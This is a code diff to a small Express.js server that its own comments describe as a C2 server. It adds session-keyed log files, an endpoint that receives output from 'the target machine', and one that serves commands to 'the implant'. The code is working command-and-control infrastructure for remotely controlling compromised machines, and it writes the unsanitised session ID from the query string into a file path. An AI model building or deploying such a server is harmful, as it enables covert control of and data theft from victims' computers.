@@ -1,5 +1,6 @@
 const express = require('express')
-const hostname = '172.31.18.80';
+const fs = require('fs')
+const hostname = 'localhost';
 const port = 443;
 var session = require('express-session');
 
@@ -14,27 +15,37 @@ app.use(session({
 }));
 
 app.get('/', (req, res) => {
-	res.send('Hello World');
 	sid = req.sessionID;
 	console.log(sid);
+	fs.writeFile(`Sessions/${sid}.log`, "Connection Established\n", err => {
+  		if (err) {
+    		console.error(err)
+    		return
+  		}
+	})
+	res.send(`${sid}`);
 });
 
-
-
 //Used to return the output from the target machine to our C2 server
-app.get('/info', (request, response) => {
-    if(request.query.info != null){
-        var InfoText = request.query.info;
+app.get('/info', (req, res) => {
+    if(req.query.info != null){
+		var sid = req.query.sid;
+        var InfoText = req.query.info;
         //InfoText = decodeURI(InfoText);
-        console.log(InfoText)
+        console.log(`${sid}: ${InfoText}`)
+		fs.appendFile(`Sessions/${sid}.log`, `${InfoText}\n`, err => {
+		  	if (err) {
+		    	console.error(err)
+		   	return
+		  	}
+		})
     }
-    response.send("Information Sent!")
+    res.send("Information Sent!")
 });
 
 //Used to send out command to the server to be read by the implant
-app.get('/retrcommand', (request, response) => {
-    response.send(command)
-
+app.get('/retrcommand', (req, res) => {
+    res.send(command)
 });
 
 app.listen(port, hostname);
